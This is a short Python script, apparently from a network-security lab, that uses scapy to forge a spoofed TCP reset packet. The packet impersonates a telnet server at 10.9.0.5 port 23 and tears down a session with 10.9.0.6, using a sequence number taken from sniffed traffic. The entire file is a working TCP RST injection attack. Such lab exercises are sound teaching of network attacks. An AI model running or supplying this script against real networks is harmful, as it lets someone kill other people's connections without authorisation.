#! /usr/bin/env python3

# RST Attack

from scapy.all import IP, TCP, send, sr1

# Define the target IP address
target_ip = "10.9.0.6"
# Define the target port
target_port = 41948
# Define the source IP address
source_ip = "10.9.0.5"
# Define the source port
source_port = 23
# Define the sequence number
seq_num = 3504611768  # ack number from the sniff_telnet.py output
ip = IP(src=source_ip, dst=target_ip)
tcp = TCP(sport=source_port, dport=target_port,
          flags="R", seq=seq_num, ack=0)
packet = ip / tcp
# Send the packet
send(packet)
